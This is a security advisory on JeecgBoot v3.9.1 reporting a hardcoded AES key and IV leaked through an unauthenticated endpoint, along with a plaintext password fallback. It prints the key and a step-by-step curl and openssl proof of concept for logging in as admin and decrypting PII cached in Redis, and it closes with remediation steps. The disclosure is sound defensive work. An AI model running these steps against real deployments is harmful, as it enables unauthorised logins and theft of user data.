# V-001: AES Encryption Key Hardcoded Leak

## Vulnerability Information

| Item | Detail |
|------|--------|
| Product | JeecgBoot |
| Version | v3.9.1 (and all prior versions) |
| Type | CWE-798: Use of Hard-coded Credentials / CWE-321: Use of Hard-coded Cryptographic Key |
| Severity | Critical |
| Attack Vector | Network (Unauthenticated) |

## Description

JeecgBoot exposes the AES-128-CBC encryption key and IV through an **unauthenticated** API endpoint `/sys/getEncryptedString`. The returned key (`1234567890adbcde`) and IV (`1234567890hjlkew`) are hardcoded constants in `EncryptedString.java` and are used for:

1. **Login password encryption** - Frontend encrypts password before transmission
2. **Redis cached sensitive data encryption** - All fields annotated with `@SensitiveField` in `LoginUser.java` (including username, realname, password hash, email, phone, orgCode, roleCode, departIds, etc.) are encrypted with this key before being stored in Redis

Additionally, `AesEncryptUtil.resolvePassword()` has a **plaintext fallback**: if AES decryption fails, the raw input is treated as the plaintext password. This renders the encryption entirely optional — an attacker can send plaintext passwords directly, bypassing the encryption altogether.

## Affected Files

- `jeecg-boot-base-core/src/main/java/org/jeecg/common/constant/enums/EncryptedString.java` - Hardcoded key/IV
- `jeecg-boot-base-core/src/main/java/org/jeecg/common/util/encryption/AesEncryptUtil.java` - Encryption utility with plaintext fallback
- `jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysUserController.java` - `/sys/getEncryptedString` endpoint
- `jeecg-boot-base-core/src/main/java/org/jeecg/common/system/vo/LoginUser.java` - 15+ `@SensitiveField` annotated fields

## Impact

1. **AES key exposure**: Any unauthenticated user can retrieve the encryption key
2. **Redis data decryption**: If an attacker gains Redis access (e.g., via SSRF, misconfig, or another vuln), they can decrypt all cached user PII (email, phone, password hash, org info)
3. **Encryption bypass**: The plaintext fallback in `resolvePassword()` means encryption provides zero security — attackers can send plaintext passwords
4. **Universal key**: All JeecgBoot instances share the same hardcoded key, making this a systemic issue

## Proof of Concept

### Step 1: Retrieve AES Key (No Authentication Required)

```bash
curl -s http://<target>:8080/jeecg-boot/sys/getEncryptedString
```

**Response:**
```json
{"success":true,"message":"","code":0,"result":{"iv":"1234567890hjlkew","key":"1234567890adbcde"},"timestamp":1776073057843}
```

### Step 2: Encrypt a Password Using the Leaked Key

```bash
echo -n '123456' | openssl enc -aes-128-cbc \
  -K "31323334353637383930616462636465" \
  -iv "31323334353637383930686a6c6b6577" \
  -base64
```

**Output:** `4SdS37appticEtjyQ2ZAfA==`

### Step 3: Verify Encrypted Password Login Works

```bash
curl -s -X POST http://<target>:8080/jeecg-boot/sys/mLogin \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"4SdS37appticEtjyQ2ZAfA=="}'
```

**Result:** Login succeeds, returns JWT token and user info.

### Step 4: Verify Plaintext Password Also Works (Fallback Bypass)

```bash
curl -s -X POST http://<target>:8080/jeecg-boot/sys/mLogin \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'
```

**Result:** Login also succeeds with plaintext password, proving encryption is optional.

### Step 5: Decrypt Redis Cached Sensitive Data

If Redis access is obtained, cached `LoginUser` objects contain AES-encrypted fields. Using the leaked key:

```bash
# Decrypt a Redis-cached field (NoPadding mode)
echo -n '<base64_from_redis>' | openssl enc -aes-128-cbc -d \
  -K "31323334353637383930616462636465" \
  -iv "31323334353637383930686a6c6b6577" \
  -nopad -base64 | tr -d '\0'
```

**Example decrypted fields from Redis `LoginUser` cache:**

| Field | Encrypted (Redis) | Decrypted |
|-------|-------------------|-----------|
| username | `SxJaEMEpPqVQ7kA/k+Bnug==` | `admin` |
| realname | `qObAmGMmtMjq2eyEL3MHMA==` | `管理员` |
| email | `jbuIn5IEp7uHjMsH10pJR8j7mKNNmflFccBrU99m9bQ=` | `jeecg@163.com` |
| phone | `DPdBJpCFqrfGWjJaRCbDtkBEOlxYdvbL+X2udKJBulc=` | `18611111111` |

## Remediation

1. Generate unique AES keys per deployment (from secure random)
2. Remove the `/sys/getEncryptedString` endpoint — key exchange should use asymmetric crypto (e.g., RSA)
3. Remove the plaintext fallback in `resolvePassword()`
4. Use per-user salted encryption for cached sensitive data

## Screenshots

![AES Key Leak](./v001_aes_key_leak.png)

浏览器直接访问 `/jeecg-boot/sys/getEncryptedString`，无需任何认证即返回 AES 密钥。

## Verification Environment

- Target: JeecgBoot v3.9.1 deployed via Docker on 192.168.217.135:18080
- Tools: curl, openssl
- Date: 2026-04-13
